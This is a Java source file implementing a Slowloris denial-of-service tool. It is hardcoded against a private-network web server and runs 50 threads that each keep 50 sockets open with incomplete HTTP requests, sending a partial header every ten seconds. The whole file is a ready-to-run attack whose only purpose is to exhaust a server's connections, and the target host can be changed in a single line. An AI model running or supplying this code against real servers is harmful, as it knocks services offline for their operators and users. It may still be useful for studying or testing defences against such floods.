
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Random;



public class SlowLorisCore {

	private String method = "GET";
	private String host = "192.168.56.101";
	private int port = 80;
	private int timeout = 10 * 1000;
	private int tcpto = 5 * 1000;
	private int connections =50;
	private boolean cache =true;
	private int threads = 50;
	private Random random = new Random();
	
	static int failed = 0;
	static int packets = 0;
	static int active = 0;
	
	
	public static void main(String[] args) {

		SlowLorisCore test = new SlowLorisCore();
		test.start();
	}

	
	public void start() {
		Thread[] t = new Thread[connections];
		for (int i = 0; i < t.length; i++) 
		{
			new Thread(new Runnable() 
			{
				public void run() {
					System.out.println("I am thread : "+ Thread.currentThread().getId());
					boolean[] w = new boolean[threads];
					Socket[] s = new Socket[threads];
					while (true) {
						System.out.println("Building Sockets...");
						try 
						{
							for (int i = 0; i < threads; i++) 
							{
								
								if (!w[i]) 
								{
									s[i] = new Socket();
									InetAddress ia = InetAddress.getByName(host);
									s[i].connect(new InetSocketAddress(ia.getHostAddress(), port),tcpto);
									w[i] = true;
									PrintWriter out = new PrintWriter(s[i].getOutputStream());
									String rand = "";
									if(cache) 
									{
										rand = "?" + (random.nextInt(Integer.MAX_VALUE));
									}
									String payload =  method + " /" + rand + " HTTP/1.1\r\n"
											+ "Host: "
											+ host
											+ "\r\n"
											+ "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
											+ "Content-Length: 42\r\n";
									out.print(payload);
									out.flush();
									packets += 3;
									++active;
								}
							}

							System.out.println("Sending Data...");
							for (int i = 0; i < threads; i++) 
							{
								if (w[i]) 
								{
									PrintWriter out = new PrintWriter(s[i].getOutputStream());
									out.print("X-a: b\r\n");
									out.flush();
									++packets;
									++active;

								} else {
									w[i] = false;
									++failed;
									--active;
								}
							}
							System.out.println("Packets send: " + packets);
							System.out.println("Packets failed: " + failed);
							System.out.println("Active connections: " + active);
							Thread.sleep(timeout);
						} catch (Exception e) {
							++failed;
							--active;
						}
					}
				}

			}).start();
		}

	}

}